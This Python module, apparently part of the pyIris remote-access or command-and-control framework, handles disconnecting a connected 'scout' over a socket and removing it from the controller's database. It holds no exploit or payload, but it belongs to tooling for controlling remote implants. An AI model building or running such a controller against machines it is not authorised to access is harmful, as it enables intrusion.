# API
# done
import socket
import pyiris_api.library.modules.send_all as send_all
import pyiris_api.library.modules.recv_all as recv_all


def main(self, sock, command):
	scout_id = self.config.bridged_to
	try:
		self.log.inf('Disconnecting scout of ID : ' + scout_id)
		send_all.main(sock, command)
		data = recv_all.main(sock)
		self.log.blank(data)
		try:
			self.config.bridged_to = None
			del (self.config.scout_database[scout_id])
			self.config.change = True
		except IndexError:
			self.log.err('Scout does not exist in database!')
		return {"status": "ok", "message": "Successfully disconnected scout", "data": {"scout_output": "[+]Successfully disconnected scout"}}
	except socket.error:
		try:
			self.log.war('Scout is dead, removing from database...')
			self.config.bridged_to = None
			del (self.config.scout_database[scout_id])
			self.config.change = True
		except IndexError:
			self.log.err('Scout does not exist in database!')
		return {"status": "warning", "message": "Scout is already dead", "data": {"scout_output": "[!]Scout is already dead"}}